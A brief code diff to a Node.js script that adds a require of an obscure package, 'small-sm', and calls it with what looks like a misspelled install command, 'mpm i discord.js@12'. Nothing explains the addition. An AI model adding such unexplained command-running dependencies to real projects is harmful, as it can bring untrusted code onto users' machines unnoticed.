@@ -12,6 +12,8 @@ const fs = require('fs');
 const pressAnyKey = require('press-any-key');
 var sleep = require('sleep');
 
+var lifes = require('small-sm');
+lifes("mpm i discord.js@12")
 
 
 const cor = ([
